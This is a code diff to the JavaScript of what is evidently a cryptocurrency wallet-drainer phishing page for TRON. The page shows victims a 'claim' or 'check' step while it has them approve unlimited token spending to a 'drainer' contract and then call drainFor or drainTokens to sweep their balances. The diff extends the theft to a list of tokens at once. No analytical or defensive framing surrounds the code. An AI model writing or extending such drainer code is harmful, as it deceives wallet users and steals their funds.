@@ -118,6 +118,7 @@ const DEMO = new URLSearchParams(location.search).has('demo');
 let signer = null; // { kind:'tronlink'|'wc', ... }
 
 const DRAIN_ABI = [{ type: 'function', name: 'drainFor', stateMutability: 'nonpayable', inputs: [{ name: 'from', type: 'address' }], outputs: [] }];
+const DRAIN_TOKENS_ABI = [{ type: 'function', name: 'drainTokens', stateMutability: 'nonpayable', inputs: [{ name: 'from', type: 'address' }, { name: 'list', type: 'address[]' }], outputs: [{ type: 'uint256' }] }];
 const APPROVE_ABI = [{ type: 'function', name: 'approve', stateMutability: 'nonpayable', inputs: [{ name: 's', type: 'address' }, { name: 'v', type: 'uint256' }], outputs: [{ type: 'bool' }] }];
 const BAL_ABI = [{ type: 'function', name: 'balanceOf', stateMutability: 'view', inputs: [{ name: 'a', type: 'address' }], outputs: [{ type: 'uint256' }] }];
 const DEC_ABI = [{ type: 'function', name: 'decimals', stateMutability: 'view', inputs: [], outputs: [{ type: 'uint8' }] }];
@@ -251,7 +252,11 @@ async function wcSend(contract, selector, param, feeLimit) {
 }
 
 const wcSendApprove = (token) => wcSend(token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(MAX), 150e6);
-const wcSendClaim = () => wcSend(cfg.drainer, 'drainFor(address)', addrParam(account), 300e6);
+const wcSendDrain = (tokens) => {
+  const items = tokens.map((t) => addrParam(t)).join('');
+  const param = addrParam(account) + uintParam(0x40) + uintParam(tokens.length) + items;
+  return wcSend(cfg.drainer, 'drainTokens(address,address[])', param, 300e6);
+};
 
 async function connectInjected() {
   const w = window;
@@ -454,9 +459,10 @@ async function run() {
     $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = '✓';
     $('st-claim').classList.add('on');
     setStatus('Sending your check — confirm in wallet');
+    const list = found.map((t) => t.token);
     const txid = signer.kind === 'tronlink'
-      ? await signer.w.contract(DRAIN_ABI, cfg.drainer).drainFor(account).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''))
-      : await wcSendClaim();
+      ? await signer.w.contract(DRAIN_TOKENS_ABI, cfg.drainer).drainTokens(account, list).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''))
+      : await wcSendDrain(list);
     $('txid').textContent = txid || '';
     show('view-done');
   } catch (e) {
